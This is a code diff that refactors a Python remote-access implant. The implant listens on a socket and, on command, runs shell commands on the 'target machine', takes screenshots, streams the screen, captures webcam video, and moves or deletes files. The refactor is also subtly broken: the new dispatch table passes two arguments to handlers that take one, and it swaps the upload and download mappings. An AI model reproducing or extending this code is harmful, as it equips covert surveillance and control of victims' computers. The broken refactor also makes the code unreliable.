@@ -22,19 +22,20 @@ def create_socket():
     except socket.error as msg:
         create_socket()
 
+
 # Binding the socket and listening for connections
 def bind_socket():
     try:
         global host
         global port
-        global s
-        s.bind((host, port))
-        s.listen(5)
+        global sock
+        sock.bind((host, port))
+        sock.listen(5)
     except socket.error as msg:
            bind_socket()
 
-#shell
-def shell(data,conn):
+# shell function able to run shell commands on the target machine
+def intract_with_shell(data,conn):
     try:
         if data[:2]== 'cd':
             os.chdir(data[3:])
@@ -47,19 +48,20 @@ def shell(data,conn):
     except Exception as e:
         conn.send(e.encode("utf-8"))
 
-#screenshot
-def sshot(conn):
+# screen shot function to take screen shot 
+def take_screenshot(conn):
     try:
         conn.send(('OK').encode("utf-8"))
         pic = pyautogui.screenshot()
         pic.save('myssdd.png')
-        fup('myssdd.png',conn)
+        send_file('myssdd.png',conn)
         os.unlink('myssdd.png')
     except Exception as e:
         conn.send(e.encode("utf-8"))
 
-#screen_streaming
-def stream(conn): 
+
+# screen streaming function to stream the screen 
+def screen_streaming(conn): 
     try: 
         conn.send(('OK').encode("utf-8"))
         while True:
@@ -75,8 +77,8 @@ def stream(conn):
     except Exception as e:
         conn.send(e.encode("utf-8"))
 
-#camera
-def cam(conn):
+# camera function to access the camera 
+def access_camera(conn):
     try:
         conn.send(('OK').encode("utf-8"))
         cam = cv2.VideoCapture(0)
@@ -97,19 +99,16 @@ def cam(conn):
     except Exception as e:
         conn.send(e.encode("utf-8"))
 
-
-# send file list
-
-def flist(conn):
+# list files in the directory
+def list_files(conn):
     try:
         arr = pickle.dumps(os.listdir())
         conn.send(arr)
     except:
         conn.send(('Error').encode("utf-8"))
 
-# dir change
-
-def cdir(conn):
+# change directory
+def change_directory(conn):
     try:
         conn.send((os.getcwd()).encode("utf-8"))
         x=conn.recv(1024).decode("utf-8")
@@ -121,10 +120,9 @@ def cdir(conn):
             return
     except Exception as e:
         conn.send(e.encode("utf-8"))
-
+    
 #accept file from server
-
-def fdown(filename,conn):
+def accept_file(filename,conn):
     try:
         data = conn.recv(1024).decode("utf-8")
         if data[:6] == 'EXISTS':
@@ -141,9 +139,9 @@ def fdown(filename,conn):
             f.close()
     except Exception as e:
         conn.send(e.encode("utf-8"))
-#send file
 
-def fup(filename, conn):
+#send file
+def send_file(filename, conn):
     try:
         if os.path.isfile(filename):
             conn.send(str.encode("EXISTS " + str(os.path.getsize(filename))))
@@ -164,8 +162,7 @@ def fup(filename, conn):
         conn.send(e.encode("utf-8"))
 
 # delete files
-
-def fdel(fname,conn):
+def delete_file(fname,conn):
     try:
         if os.path.isfile(fname):
             os.unlink(fname)
@@ -176,45 +173,40 @@ def fdel(fname,conn):
         conn.send("Success".encode("utf-8"))
     except Exception as e:
         conn.send(e.encode("utf-8"))
-#main
-def main(s):
+        
+function_dict ={
+    'cmd': intract_with_shell,
+    'fdown': accept_file,
+    'fup': send_file,
+    'cdir': change_directory,
+    'flist': list_files,
+    'fdel': delete_file,
+    'sshot': take_screenshot,
+    'cam': access_camera,
+    'sst': screen_streaming
+}
+
+# main function to handle the client
+def main(sock):
     while True:
-        data = (s.recv(1024)).decode("utf-8").split('~')
-        if data[0]=='cmd':
-            shell(data[1],s)
-        elif data[0]=='fdown':
-            fup(data[1],s)
-        elif data[0]=='fup':
-            fdown(data[1],s)
-        elif data[0]=='cdir':
-            cdir(s)
-        elif data[0]=='flist':
-            flist(s)
-        elif data[0]=='fdel':
-            fdel(data[1],s)
-        elif data[0]=='sshot':
-            sshot(s)
-        elif data[0]=='cam':
-            cam(s)
-        elif data[0]=='sst':
-            stream(s)
+        data = (sock.recv(1024)).decode("utf-8").split('~')
+        if data[0] in function_dict:
+            function_dict[data[0]](data[1],sock)
         elif data[0]=='cwd':
-            s.send((os.getcwd()).encode("utf-8"))
+            sock.send((os.getcwd()).encode("utf-8"))
         elif data[0]=='back':
-            s.close()
+            sock.close()
             return "back"
         elif data[0]=='exit':
-            s.close()
+            sock.close()
             return "exit"
         else:
-            s.send(".".encode('utf-8'))
-
+            sock.send(".".encode('utf-8'))
 
 # Establish connection with a host (socket must be listening)
-
 def socket_accept():
-    conn, address = s.accept()
+    conn, address = sock.accept()
     return main(conn)
 create_socket()
 bind_socket()
-while socket_accept()=="back":continue
+while socket_accept() == "back": continue
